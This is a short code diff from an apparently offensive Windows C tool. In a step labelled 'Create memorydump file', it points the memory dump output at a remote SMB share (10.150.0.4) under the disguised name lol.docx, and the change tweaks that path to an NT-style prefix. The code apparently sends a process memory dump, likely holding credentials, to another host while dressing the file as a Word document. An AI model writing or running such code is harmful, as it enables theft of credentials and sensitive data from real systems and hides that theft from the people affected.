@@ -236,7 +236,7 @@ int wmain(int argc, wchar_t* argv[]) {
 
 	wprintf(L"[3] Create memorydump file:\n");
 
-	WCHAR chDmpFile[MAX_PATH] = L"\\\\10.150.0.4\\public\\lol.docx";
+	WCHAR chDmpFile[MAX_PATH] = L"\\??\\\\10.150.0.4\\public\\lol.docx";
 	//WCHAR chWinPath[MAX_PATH];
 	//GetWindowsDirectory(chWinPath, MAX_PATH);
 	//wcscat_s(chDmpFile, sizeof(chDmpFile) / sizeof(wchar_t), chWinPath);
